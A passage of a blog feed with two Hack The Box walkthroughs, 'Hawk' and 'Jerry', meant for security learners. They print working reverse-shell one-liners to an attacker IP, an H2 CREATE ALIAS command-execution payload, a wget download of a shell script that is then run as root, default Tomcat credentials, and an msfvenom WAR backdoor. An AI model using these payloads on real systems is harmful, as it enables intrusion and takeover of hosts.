&lt;h4 id=&quot;now-we-have-a-username--daniel-and-a-password--pencilkeybaordscanner123&quot;&gt;Now we have a username : “daniel” and a password : PencilKeybaordScanner123&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;drupal&quot;&gt;Drupal&lt;/h3&gt;
&lt;h4 id=&quot;we-see-in-the-message-that-the-password-is-for-a-portal-but-what-portal&quot;&gt;We see in the message that the password is for a portal. But what portal?&lt;/h4&gt;
&lt;h4 id=&quot;lets-visit-the-website-on-port-80&quot;&gt;Let’s visit the website on port 80&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-see-that-its-running-drupal-cms&quot;&gt;We see that it’s running drupal CMS&lt;/h4&gt;
&lt;h4 id=&quot;lets-login-with-the-credentials-we-have&quot;&gt;Let’s login with the credentials we have.&lt;/h4&gt;
&lt;h4 id=&quot;username-daniel-didnt-work-but-admin-worked-and-we-got-in-as-admin-&quot;&gt;Username daniel didn’t work but admin worked and we got in as admin !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-we-enumerate-for-a-while-we-will-see-some-interesting-stuff&quot;&gt;After we enumerate for a while we will see some interesting stuff.&lt;/h4&gt;
&lt;h4 id=&quot;the-content-tab-which-allows-us-to-add-content-and-the-modules-tab&quot;&gt;The content tab which allows us to add content and the modules tab.&lt;/h4&gt;
&lt;h4 id=&quot;if-we-tried-to-add-content-we-will-get-two-options--article-or-a-basic-page&quot;&gt;If we tried to add content we will get two options : Article or a basic page.&lt;/h4&gt;
&lt;h4 id=&quot;we-will-focus-on-basic-pages-for-sure-but-we-can-only-use-html--filtered-html-and-plain-text-&quot;&gt;We will focus on basic pages for sure but we can only use html , filtered html and plain text .&lt;/h4&gt;
&lt;h4 id=&quot;lets-look-in-the-modules-tab&quot;&gt;Let’s look in the modules tab.&lt;/h4&gt;
&lt;h4 id=&quot;we-will-find-a-module-called-php-filter-which-allows-us-to-use-php-in-pages-after-we-enable-it-we-will-get-a-fourth-option--php-code&quot;&gt;We will find a module called php filter which allows us to use php in pages. After we enable it we will get a fourth option : php code&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;great--lets-get-a-reverse-shell&quot;&gt;Great ! Let’s get a reverse shell&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;?php exec(&quot;/bin/bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.xx.xx/9090 0&amp;gt;&amp;amp;1'&quot;);&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/hawk/9.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/hawk/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-check-our-listener&quot;&gt;Let’s check our listener.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;bam-we-got-a-low-privilege-shell-as-www-data-&quot;&gt;bam we got a low privilege shell as www-data !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;privilege-escalation-to-daniel&quot;&gt;Privilege Escalation to daniel&lt;/h3&gt;
&lt;h4 id=&quot;so-were-now-in-as-www-data-lets-check-sensetive-files-first&quot;&gt;So we’re now in as www-data let’s check sensetive files first.&lt;/h4&gt;
&lt;h4 id=&quot;in-drupal-7-documentation-this-section-its-mentioned-that-settingsphp-contains-where-the-database-is-located--how-to-access-it-and-the-credentials-to-access-it-so-this-file-has-some-sensetive-information-lets-check-that-out&quot;&gt;In drupal 7 documentation &lt;a href=&quot;https://www.drupal.org/docs/7/install/step-3-create-settingsphp-and-the-files-directory&quot;&gt;This section&lt;/a&gt; it’s mentioned that settings.php contains where the database is located , how to access it and the credentials to access it. So this file has some sensetive information let’s check that out.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/12.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/hawk/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-a-password--drupal4hawk--lets-try-ssh&quot;&gt;We got a password : drupal4hawk , Let’s try ssh&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-in--but-when-we-login-we-get-a-python-interpreter-we-will-get-a-shell-with-pty&quot;&gt;We got in ! But when we login we get a python interpreter. We will get a shell with pty&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import pty
pty.spawn(&quot;/bin/sh&quot;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-got-user--d&quot;&gt;And we got user ! :D&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;accessing-h2-database&quot;&gt;Accessing H2 Database&lt;/h3&gt;
&lt;h4 id=&quot;now-with-some-regular-enumeration-if-we-check-out-root-processes-we-will-see-those-2-processes&quot;&gt;Now with some regular enumeration if we check out root processes we will see those 2 processes.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;sounds-familiar--yup-the-h2-database&quot;&gt;Sounds familiar ? Yup the H2 Database.&lt;/h4&gt;
&lt;h4 id=&quot;if-we-return-to-our-nmap-scan-we-will-see-port-8082-running-h2-database-http-console&quot;&gt;If we return to our nmap scan we will see port 8082 running H2 Database HTTP Console.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-know-that-its-running-as-root-so-lets-try-to-access-that&quot;&gt;Now we know that it’s running as root so let’s try to access that.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;remote-connection-is-disabled-this-means-that-we-can-only-connect-locally&quot;&gt;Remote connection is disabled. This means that we can only connect locally.&lt;/h4&gt;
&lt;h4 id=&quot;to-bypass-that-we-will-use-ssh-tunneling&quot;&gt;To bypass that we will use ssh tunneling.&lt;/h4&gt;
&lt;h4 id=&quot;and-if-you-dont-know-what-ssh-tunneling-is--simply-we-will-forward-the-connection-from-the-box-to-our-machine-this-means-that-the-h2-console-will-be-accessed-locally-from-the-box-then-that-connection-will-be-forwarded-to-us&quot;&gt;And if you don’t know what ssh tunneling is … simply we will forward the connection from the box to our machine. This means that the H2 console will be accessed locally from the box then that connection will be forwarded to us.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ssh -L 8080:127.0.0.1:8082 daniel@10.10.10.102&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/hawk/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-if-we-visit-our-localhost-on-port-8080-we-will-get-the-login-page&quot;&gt;Now if we visit our localhost on port 8080 we will get the login page.&lt;/h4&gt;
&lt;h4 id=&quot;by-default-it-doesnt-have-a-password-so-we-can-access-the-console-without-credentials-but-when-we-login-without-credentials-it-gives-an-error&quot;&gt;By default it doesn’t have a password so we can access the console without credentials but when we login without credentials it gives an error.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-try-changing-the-jdbc-url-to-something-we-know-that-it-exists-root&quot;&gt;Let’s try changing the JDBC URL to something we know that it exists. /root&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-worked--now-we-have-access-to-the-console&quot;&gt;It worked . Now we have access to the console.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/21.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;abusing-h2-database-alias-and-privilege-escalation-to-root&quot;&gt;Abusing H2 Database ALIAS and Privilege Escalation to root&lt;/h3&gt;
&lt;h4 id=&quot;basically-the-create-alias-method-creates-a-function-that-executes-java-code&quot;&gt;Basically the &lt;a href=&quot;http://www.h2database.com/html/grammar.html#create_alias&quot;&gt;CREATE ALIAS&lt;/a&gt; method creates a function that executes java code.&lt;/h4&gt;
&lt;h4 id=&quot;since-we-can-execute-java-code-then-we-can-do-anything-so-we-will-create-a-function-that-executes-system-commands-then-we-will-get-a-shell&quot;&gt;Since we can execute java code then we can do anything. So we will create a function that executes system commands then we will get a shell.&lt;/h4&gt;
&lt;h4 id=&quot;first-we-will-create-alias-called-shellexec-the-payload-will-be-like-this-&quot;&gt;First we will create ALIAS called SHELLEXEC. The payload will be like this :&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;); return s.hasNext() ? s.next() : &quot;&quot;;  }$$;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-execute-system-commands-by-calling-the-function-that-we-created-lets-execute-whoami&quot;&gt;Then we will execute system commands by calling the function that we created. Let’s execute whoami.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;call SHELLEXEC(&quot;whoami&quot;)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-see-root-d&quot;&gt;And we see root :D&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;note-that-h2-database-alias-exploit-is-not-mine-credits-go-to-the-creator--check-his-write-up-about-the-exploit-here&quot;&gt;&lt;em&gt;NOTE: That H2 Database ALIAS exploit is not mine. Credits go to the creator . check his write-up about the exploit &lt;a href=&quot;https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html&quot;&gt;here&lt;/a&gt;&lt;/em&gt;&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-since-we-can-execute-system-commands-its-over--we-can-get-a-root-shell&quot;&gt;now since we can execute system commands it’s over ! We can get a root shell.&lt;/h4&gt;
&lt;h4 id=&quot;but-we-cant-write-a-shell-command-and-execute-it-right-away-it-wont-work-so-instead-of-that-we-can-write-our-shell-in-a-sh-file-then-upload-it-and-execute-it&quot;&gt;But We can’t write a shell command and execute it right away it won’t work so instead of that we can write our shell in a .sh file then upload it and execute it.&lt;/h4&gt;
&lt;h4 id=&quot;another-way-is-to-use-msfvenom-but-its-not-needed-here-because-the-exploit-is-simple&quot;&gt;Another way is to use msfvenom but it’s not needed here because the exploit is simple.&lt;/h4&gt;
&lt;h4 id=&quot;first-we-will-create-the-shell-file&quot;&gt;First we will create the shell file.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.xx.xx/1234 0&amp;gt;&amp;amp;1 &amp;gt; shell&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-set-up-a-http-server-with-python-to-host-the-shell&quot;&gt;Then we will set up a HTTP server with python to host the shell.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python -m SimpleHTTPServer 7777&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/hawk/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-will-use-wget-to-get-the-shell-file-on-the-box&quot;&gt;Now we will use wget to get the shell file on the box.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;call SHELLEXEC(&quot;wget http://10.10.xx.xx:7777/shell&quot;)&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/hawk/25.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/hawk/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-will-make-the-file-executable&quot;&gt;We will make the file executable.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;call SHELLEXEC(&quot;chmod +x shell&quot;)&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/hawk/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-rename-it-to-shellsh&quot;&gt;Then we will rename it to shell.sh&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;call SHELLEXEC(&quot;mv shell shell.sh&quot;)&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/hawk/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-finally-we-execute-it&quot;&gt;And finally we execute it.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;call SHELLEXEC(&quot;bash shell.sh&quot;)&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/hawk/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-dont-get-a-response-which-is-a-good-sign-lets-check-our-listener&quot;&gt;We don’t get a response which is a good sign. Let’s check our listener.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-get-a-shell-as-root--d&quot;&gt;And we get a shell as root ! :D&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;that-was-hawk-feedback-is-appreciated-&quot;&gt;That was Hawk. Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;</content><author><name></name></author><summary type="html">Hawk has retired and this is my write-up about it. It’s a Linux box and it’s ip is 10.10.10.102 so let’s jump right in ! Nmap Starting with a simple nmap scan to scan tor TCP , UDP ports and services. nmap -sV -sT -sU 10.10.10.102 We will see that we got FTP on port 21 , SSH on port 22 , HTTP on port 80 running apache server and HTTP on port 8082 running H2 Database HTTP Console. FTP Since there’s FTP on the box let’s check if we can do anonymous login. We could login as anonymous and we got a file called : .drupal.txt.enc Since it ends with .enc then it’s an encrypted file. Let’s run file command against it to get more information. file drupal.txt.enc drupal.txt.enc : openssl enc'd data with salted password , base64 encoded So base64 encoded ? Let’s decode it. base64 -d drupal.txt.enc &amp;gt; drupal_decoded.txt.enc Now the file is ready for bruteforcing. Decrypting The File To get the password for decryption we will use a tool called bruteforce-salted-openssl with rockyou. It’s already installed on kali but if you’re not using kali you can get it from here Now there’s a small problem. We need to specify the right cipher and digest to be able to crack the file so we have to do some guessing. I already cracked it so the cipher is AES-256-CBC and the digest is SHA256. bruteforce-salted-openssl -t 50 -f /usr/share/wordlists/rockyou.txt -d sha256 drupal_decoded.txt.enc -1 You may ask yourself why I didn’t specify the cipher. I didn’t specify it because the tool uses AES-256-CBC by default. Great ! We got the password : friends . Let’s decrypt the file. openssl aes-256-cbc -d -in drupal_decoded.txt.enc -out drupal.txt -k friends Now we have a username : “daniel” and a password : PencilKeybaordScanner123 Drupal We see in the message that the password is for a portal. But what portal? Let’s visit the website on port 80 We see that it’s running drupal CMS Let’s login with the credentials we have. Username daniel didn’t work but admin worked and we got in as admin ! After we enumerate for a while we will see some interesting stuff. The content tab which allows us to add content and the modules tab. If we tried to add content we will get two options : Article or a basic page. We will focus on basic pages for sure but we can only use html , filtered html and plain text . Let’s look in the modules tab. We will find a module called php filter which allows us to use php in pages. After we enable it we will get a fourth option : php code Great ! Let’s get a reverse shell &amp;lt;?php exec(&quot;/bin/bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.xx.xx/9090 0&amp;gt;&amp;amp;1'&quot;); Let’s check our listener. bam we got a low privilege shell as www-data ! Privilege Escalation to daniel So we’re now in as www-data let’s check sensetive files first. In drupal 7 documentation This section it’s mentioned that settings.php contains where the database is located , how to access it and the credentials to access it. So this file has some sensetive information let’s check that out. We got a password : drupal4hawk , Let’s try ssh We got in ! But when we login we get a python interpreter. We will get a shell with pty import pty pty.spawn(&quot;/bin/sh&quot;) And we got user ! :D Accessing H2 Database Now with some regular enumeration if we check out root processes we will see those 2 processes. Sounds familiar ? Yup the H2 Database. If we return to our nmap scan we will see port 8082 running H2 Database HTTP Console. Now we know that it’s running as root so let’s try to access that. Remote connection is disabled. This means that we can only connect locally. To bypass that we will use ssh tunneling. And if you don’t know what ssh tunneling is … simply we will forward the connection from the box to our machine. This means that the H2 console will be accessed locally from the box then that connection will be forwarded to us. ssh -L 8080:127.0.0.1:8082 daniel@10.10.10.102 Now if we visit our localhost on port 8080 we will get the login page. By default it doesn’t have a password so we can access the console without credentials but when we login without credentials it gives an error. Let’s try changing the JDBC URL to something we know that it exists. /root It worked . Now we have access to the console. Abusing H2 Database ALIAS and Privilege Escalation to root Basically the CREATE ALIAS method creates a function that executes java code. Since we can execute java code then we can do anything. So we will create a function that executes system commands then we will get a shell. First we will create ALIAS called SHELLEXEC. The payload will be like this : CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;); return s.hasNext() ? s.next() : &quot;&quot;; }$$; Then we will execute system commands by calling the function that we created. Let’s execute whoami. call SHELLEXEC(&quot;whoami&quot;) And we see root :D NOTE: That H2 Database ALIAS exploit is not mine. Credits go to the creator . check his write-up about the exploit here now since we can execute system commands it’s over ! We can get a root shell. But We can’t write a shell command and execute it right away it won’t work so instead of that we can write our shell in a .sh file then upload it and execute it. Another way is to use msfvenom but it’s not needed here because the exploit is simple. First we will create the shell file. bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.xx.xx/1234 0&amp;gt;&amp;amp;1 &amp;gt; shell Then we will set up a HTTP server with python to host the shell. python -m SimpleHTTPServer 7777 Now we will use wget to get the shell file on the box. call SHELLEXEC(&quot;wget http://10.10.xx.xx:7777/shell&quot;) We will make the file executable. call SHELLEXEC(&quot;chmod +x shell&quot;) Then we will rename it to shell.sh call SHELLEXEC(&quot;mv shell shell.sh&quot;) And finally we execute it. call SHELLEXEC(&quot;bash shell.sh&quot;) We don’t get a response which is a good sign. Let’s check our listener. And we get a shell as root ! :D That was Hawk. Feedback is appreciated ! Thanks for reading.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/hawk/0.png" /></entry><entry><title type="html">Hack The Box - Jerry</title><link href="http://localhost:4000/hack-the-box/jerry/" rel="alternate" type="text/html" title="Hack The Box - Jerry" /><published>2018-11-17T00:00:00+02:00</published><updated>2018-11-17T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/jerry</id><content type="html" xml:base="http://localhost:4000/hack-the-box/jerry/">&lt;hr /&gt;

&lt;h4 id=&quot;jerry-has-retired-and-this-is-my-write-up-about-it&quot;&gt;Jerry has retired and this is my write-up about it…&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;jerry-was-one-of-the-easiest-boxes-on-htb-it-was-a-beginner-box-&quot;&gt;Jerry was one of the easiest boxes on HTB. It was a beginner-box .&lt;/h4&gt;
&lt;h4 id=&quot;its-a-windows-box-and-its-ip-is-10101095&quot;&gt;It’s a windows box and its ip is 10.10.10.95&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/jerry/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;starting-with-nmap-to-scan-for-tcp-ports-and-services-&quot;&gt;Starting with nmap to scan for tcp ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT 10.10.10.95&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/jerry/1.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-can-see-that-the-port-8080-is-open-and-running-http-and-the-server-is-apache-tomcat&quot;&gt;We can see that the port 8080 is open and running http and the server is Apache Tomcat.&lt;/h4&gt;
&lt;h4 id=&quot;by-visiting-it-in-the-browser-we-get-the-default-tomcat-configuration-page&quot;&gt;By visiting it in the browser we get the default tomcat configuration page.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/jerry/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;theres-a-manager-app-so-lets-try-to-access-it-&quot;&gt;There’s a manager app so let’s try to access it .&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/jerry/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-asks-for-authentication-and-common-passwords-like-those-mentioned-below-didnt-work&quot;&gt;It asks for authentication and common passwords like those mentioned below didn’t work:&lt;/h4&gt;
&lt;p&gt;&lt;em&gt;tomcat:tomcat&lt;/em&gt; &lt;br /&gt;
&lt;em&gt;admin:admin&lt;/em&gt; &lt;br /&gt;
&lt;em&gt;admin:password&lt;/em&gt; &lt;br /&gt;
&lt;em&gt;user:password&lt;/em&gt; &lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-by-closing-the-login-panel-it-causes-an-error-because-we-are-not-authorized-to-view-the-manager-page&quot;&gt;So by closing the login panel it causes an error because we are not authorized to view the manager page&lt;/h4&gt;
&lt;h4 id=&quot;but-by-looking-at-the-error-page-&quot;&gt;But by looking at the error page :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/jerry/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-shows-these-credentials-&quot;&gt;It shows these credentials :&lt;/h4&gt;
&lt;p&gt;&lt;em&gt;tomcat:s3cret&lt;/em&gt;&lt;/p&gt;
&lt;h4 id=&quot;this-seems-to-be-a-part-of-the-documentation-and-those-credentials-are-dafault-credentials&quot;&gt;This seems to be a part of the documentation and those credentials are dafault credentials.&lt;/h4&gt;
&lt;h4 id=&quot;will-they-work--yup-&quot;&gt;Will they work ? yup !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/jerry/5.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/jerry/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;
&lt;h4 id=&quot;now-we-are-logged-in-to-the-manager-app-and-we-can-get-a-shell-from-here&quot;&gt;Now we are logged in to the manager app and we can get a shell from here&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-are-on-an-apache-tomcat-server-and-apache-tomcat-uses-war-files&quot;&gt;We are on an apache tomcat server and apache tomcat uses WAR files.&lt;/h4&gt;
&lt;h4 id=&quot;to-get-a-reverse-shell-we-will-use-msfvenom-to-create-the-payload-&quot;&gt;To get a reverse shell we will use msfvenom to create the payload :&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.xx.xx LPORT=4449 -f war &amp;gt; backdoor.war&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/jerry/7.jpg&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-upload-our-payload-to-the-server&quot;&gt;Then we will upload our payload to the server.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/jerry/8.jpg&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/jerry/9.jpg&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-listen-to-the-port-with-netcat-&quot;&gt;Then we will listen to the port with netcat :&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;nc -lvnp 4449&lt;/code&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-got-a-reverse-shell-as-admin-so-theres-no-need-for-previlege-escalation&quot;&gt;Now we got a reverse shell as admin so there’s no need for previlege escalation.&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/images/hackthebox/jerry/10.jpg&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/jerry/11.jpg&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/jerry/12.jpg&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h4 id=&quot;another-way-to-do-this-is-to-use-this-tool-written-by-mgeeky-tomcatwardeployer-to-automate-the-process-of-getting-a-shell&quot;&gt;Another way to do this is to use this tool written by &lt;strong&gt;mgeeky&lt;/strong&gt; &lt;a href=&quot;https://github.com/mgeeky/tomcatWarDeployer&quot;&gt;TomcatWarDeployer&lt;/a&gt; to automate the process of getting a shell&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/jerry/13.jpg&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-that-was-jerry-&quot;&gt;And that was Jerry .&lt;/h4&gt;
&lt;h4 id=&quot;feedback-is-appreciated-d&quot;&gt;Feedback is appreciated :D&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thanks-for-reading-&quot;&gt;Thanks for reading .&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;</content><author><name></name></author><summary type="html">Jerry has retired and this is my write-up about it… Jerry was one of the easiest boxes on HTB. It was a beginner-box . It’s a windows box and its ip is 10.10.10.95 Starting with nmap to scan for tcp ports and services : nmap -sV -sT 10.10.10.95 We can see that the port 8080 is open and running http and the server is Apache Tomcat. By visiting it in the browser we get the default tomcat configuration page. There’s a manager app so let’s try to access it . It asks for authentication and common passwords like those mentioned below didn’t work: tomcat:tomcat admin:admin admin:password user:password So by closing the login panel it causes an error because we are not authorized to view the manager page But by looking at the error page : It shows these credentials : tomcat:s3cret This seems to be a part of the documentation and those credentials are dafault credentials. Will they work ? yup ! Exploitation Now we are logged in to the manager app and we can get a shell from here We are on an apache tomcat server and apache tomcat uses WAR files. To get a reverse shell we will use msfvenom to create the payload : msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.xx.xx LPORT=4449 -f war &amp;gt; backdoor.war Then we will upload our payload to the server. Then we will listen to the port with netcat : nc -lvnp 4449 Now we got a reverse shell as admin so there’s no need for previlege escalation.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/jerry/0.png" /></entry></feed>